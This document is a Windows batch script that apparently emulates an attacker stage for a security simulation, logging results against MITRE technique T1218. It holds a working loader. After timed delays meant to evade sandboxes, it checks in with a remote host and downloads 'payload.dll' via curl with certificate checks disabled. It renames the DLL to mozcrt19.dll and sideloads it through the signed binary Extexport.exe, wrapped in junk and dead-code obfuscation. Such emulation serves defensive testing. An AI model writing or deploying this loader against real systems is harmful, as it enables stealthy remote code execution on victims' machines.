@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ variable assignments (plain literals, no transformations)
SET zxmqp=https://10.0.0.49
SET yktnwwf=%APPDATA%\7760\a9991f14
SET fpakbq=Macula-Stage0-7760
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7760-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=potoshop.txt
SET fpldhe=7760

REM Random variable names for internal use
SET mnbvfr=0
SET qwzxcq=https://10.0.0.49/stage/2/icon.png?7760-10
SET plkmjm=curl
SET tyuiop=Extexport.exe
SET vbnmcv=mozcrt19.dll
SET lkjhgv=%APPDATA%\!yydue!
SET hgfdsw=macula-simulations.log

REM Initial delay (evade sandbox)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
ping -n 8 127.0.0.1 >nul
timeout /t 15 /nobreak >nul
CHOICE /C Y /N /D Y /T 7 >nul
SET /A wqasde=!RANDOM! %% 20 + 10
timeout /t !wqasde! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>>> "!lkjhgv!\!hgfdsw!" 2>nul

REM Start state machine
SET mnbvfr=0
GOTO dispatch_state

REM Dead code section (never reached)
:dead_label_akjdh
SET fakevar1=dead_value
GOTO dead_label_plkmj
:dead_label_plkmj
EXIT /B 1

REM Main dispatch
:dispatch_state
IF !mnbvfr!==0 GOTO state_initial
IF !mnbvfr!==17 GOTO state_heartbeat
IF !mnbvfr!==42 GOTO state_download
IF !mnbvfr!==99 GOTO state_execute
IF !mnbvfr!==123 GOTO state_cleanup
GOTO dead_label_akjdh

REM State 0: Initial setup
:state_initial
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: setup_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
IF NOT EXIST "!lkjhgv!" mkdir "!lkjhgv!"
IF 1==1 (
    SET mnbvfr=17
) ELSE (
    GOTO dead_label_plkmj
)
GOTO dispatch_state

REM More dead code
:junk_label_qwert
REM Never executed fake operations
SET junkvar2=fake_data
SET junkvar3=more_fake
GOTO junk_label_asdfg
:junk_label_asdfg
EXIT /B 0

REM State 17: Heartbeat check
:state_heartbeat
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
timeout /t 5 /nobreak >nul
!plkmjm! -k -s -o nul "!rdzgrnne!"
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success>>> "!lkjhgv!\!hgfdsw!" 2>nul
    SET mnbvfr=42
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed>>> "!lkjhgv!\!hgfdsw!" 2>nul
    SET mnbvfr=123
)
GOTO dispatch_state

REM State 42: Download DLL
:state_download
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
ping -n 3 127.0.0.1 >nul
!plkmjm! -k -s -o "!yktnwwf!\!edjwtl!" "http://!repbmqg!/payload.dll"
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_complete>>> "!lkjhgv!\!hgfdsw!" 2>nul
    SET mnbvfr=99
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_failed>>> "!lkjhgv!\!hgfdsw!" 2>nul
    SET mnbvfr=123
)
CHOICE /C Y /N /D Y /T 8 >nul
GOTO dispatch_state

REM State 99: Execute
:state_execute
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
timeout /t 3 /nobreak >nul
IF EXIST "!yktnwwf!\!edjwtl!" (
    ren "!yktnwwf!\!edjwtl!" "!vbnmcv!"
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete>>> "!lkjhgv!\!hgfdsw!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_failed>>> "!lkjhgv!\!hgfdsw!" 2>nul
    GOTO state_cleanup
)

REM TTP logging for T1218
SET RESULT=1
SET ERR_DETAIL=
!tyuiop! %CD% foo bar
IF NOT !ERRORLEVEL! EQU 0 (
    SET RESULT=0
    SET ERR_DETAIL=execution_failed
)
(
    echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!
) >> "!lkjhgv!\!hgfdsw!" 2>nul || echo >nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_complete>>> "!lkjhgv!\!hgfdsw!" 2>nul
SET mnbvfr=123
GOTO dispatch_state

REM State 123: Cleanup
:state_cleanup
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: cleanup_start>>> "!lkjhgv!\!hgfdsw!" 2>nul
timeout /t 2 /nobreak >nul
IF EXIST "!vbnmcv!" del "!vbnmcv!" >nul 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: cleanup_complete>>> "!lkjhgv!\!hgfdsw!" 2>nul
GOTO script_end

REM Final dead code block
:dead_final_block
REM This entire section never executes
SET fake1=data1
SET fake2=data2
IF 0==1 (
    GOTO script_end
) ELSE (
    GOTO dead_final_block
)

:script_end
ENDLOCAL